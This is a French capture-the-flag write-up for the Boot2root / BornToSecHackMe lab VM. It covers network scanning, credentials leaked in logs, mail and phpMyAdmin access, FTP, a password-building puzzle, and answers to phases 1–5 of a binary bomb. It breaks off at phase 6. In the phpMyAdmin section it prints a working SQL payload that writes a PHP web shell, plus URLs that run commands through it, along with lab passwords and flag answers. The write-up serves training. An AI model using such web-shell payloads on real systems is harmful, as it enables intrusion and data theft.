# Writeup1
## 1. Découvrir l'adresse IP
* Mode host-only
```
ipconfig 
nmmap  192.168.56.0/24 
``` 
![alt text](image-1.png)

* vboxnet0 : interface qui fait partie de VirtualBox  utilisée pour les connexions réseau entre l'hôte (la machine physique) et les machines virtuelles. 
Adresse IPv4 : inet 192.168.56.1
![alt text](image-2.png)
* nmap 192.168.56.0/24 scanne toutes les adresses IP dans le sous-réseau (0-255) pour détecter les hôtes actifs et les ports ouverts sur ces machines = cartographier le réseau local.

* L'adresse du serveur est donc :  192.168.56.101
![alt text](image-3.png)

## 2. Websites


## 3. Forum
#### Password of a user : lmezard
![alt text](image-4.png)

* Grep tous les invalid user, on voit qu'une entrée semble être un mot de passe :

`curl -k https://192.168.56.101/forum/index.php\?id\=6  | grep "invalid user"`

Output :  
`
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
`
Pseudo : lmezard
Password : !q\]Ej?*5K5cy*AJ
Email : laurie@borntosec.net 

Les autres utilisateurs sont :
![alt text](image-5.png)

## 4. SquirrelMail

Avec les identifiants trouvés sur le forum, on se connecte:
Email : laurie@borntosec.net 
Password : !q\]Ej?*5K5cy*AJ

![alt text](image-6.png)

user : root
Password : Fg-'kKXBj87E:aJ$

## 5. phpmyadmin
* Application web open-source écrite en PHP qui permet de gérer facilement des bases de données MySQL et MariaDB via une interface graphique accessible depuis un navigateur web.
:
1. Connexion avec les identifiants récupérés

2. 
```sql
SELECT '<? system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```
*<? ... ?> : C'est la syntaxe de base du PHP. Cela indique que le contenu entre les balises doit être interprété comme du code PHP.
* system($_GET["cmd"]) : La fonction system() en PHP permet d'exécuter une commande système sur le serveur. Dans ce cas, la commande à exécuter est fournie par un paramètre d'URL via $_GET["cmd"]. Par exemple, si l'URL était backdoor.php?cmd=ls, cela exécuterait la commande ls sur le serveur, qui liste les fichiers dans le répertoire courant.

*`INTO OUTFILE` ->
* Le fichier sera placé dans le répertoire `/var/www/forum/templates_c/`, qui est un dossier typiquement utilisé pour stocker des fichiers temporaires ou des caches dans une application web.
* Le fichier s'appelle `backdoor.php`, ce qui est un nom typiquement utilisé pour désigner un accès caché ou un accès de backdoor au serveur.
Le fichier PHP créé aura le code suivant :
<?php system($_GET["cmd"]); ?>
```
https://192.168.56.101/forum/templates_c/backdoor.php?cmd=%22ls%22%20/home/

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=%22ls%22%20/home/LOOKATME/password

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=%22cat%22%20/home/LOOKATME/password

```
![alt text](image-7.png)

lmezard:G!@M6f4Eatau{sF"

* Ne fonctionne pas en ssh
* Fonctionne en ftp

## 6. FTP

```
ftp
open
192.168.56.101
lmezard
G!@M6f4Eatau{sF"
```
![alt text](image-8.png)

* On a deux fichier README & fun
```
get fun
get README
```
![alt text](image-9.png)

## 7. Challenge ssh laurie


```
cat README
file README
file fun
```
![alt text](image-10.png)
* ft_fun est un dossier remplit de fichier .pcap

* Ce sont de faux fichiers :

![alt text](image-11.png)

1. Print tous les fichiers avec print_files.py
2. Trouver le fichier avec main() avec find_main.py
3. Concatenons les fichiers dans l'ordre `python scripts/concatenate_files.py /mnt/nfs/homes/abensett/Desktop/29.-Boot2root/ft_fun resultats.c`
4. `gcc resultats.c` `./a.out` -> `MY PASSWORD IS: Iheartpwnage Now SHA-256 it and submit`
5. sha256 du mot de passe : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

* laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

## 8. ssh

1. On se connecte avec les identifiants, on obtient deux fichiers bomb et README
![alt text](image-12.png)
2. On télécharge le fichier bombe avec scp : `scp -p 22 laurie@192.168.56.101:/home/laurie/bomb .`
3. Reverse Engineering avec Ghidra :
1. `Public speaking is very easy.`
2. Les entrées doivent être :
Le premier nombre : 1
Le deuxième nombre : 2 (car 2 * 1 = 2)
Le troisième nombre : 6 (car 3 * 2 = 6)
Le quatrième nombre : 24 (car 4 * 6 = 24)
Le cinquième nombre : 120 (car 5 * 24 = 120)
Le sixième nombre : 720 (car 6 * 120 = 720)
`1 2 6 24 120 720`
3. `0 q 777`
4. Dans la fonction phase_4, l'entrée de l'utilisateur (un entier) est passé à func4. Si func4(local_8) retourne 55 (soit 0x37), la fonction se termine correctement. Sinon, la "bombe" explose.

En analysant les valeurs de la suite de Fibonacci, on trouve que func4(9) retourne 55. Donc, pour éviter l'explosion, l'utilisateur doit entrer 9 comme valeur
`9`
5. giants
* Le chiffrement utilise les 4 derniers bits de chaque caractère pour déterminer à quel caractère de la clé key il correspond.
* Comme plusieurs caractères peuvent partager les mêmes 4 derniers bits, il existe plusieurs entrées valides pour obtenir la sortie "giants".
* Cela conduit à plusieurs combinaisons d'entrées valides, qui peuvent aboutir à la même chaîne de sortie.
Ainsi, la réponse à cette phase du défi pourrait être n'importe quelle chaîne d'entrée parmi les possibilités valides comme "opekma", "opekmq", ou "opukmq".

6.


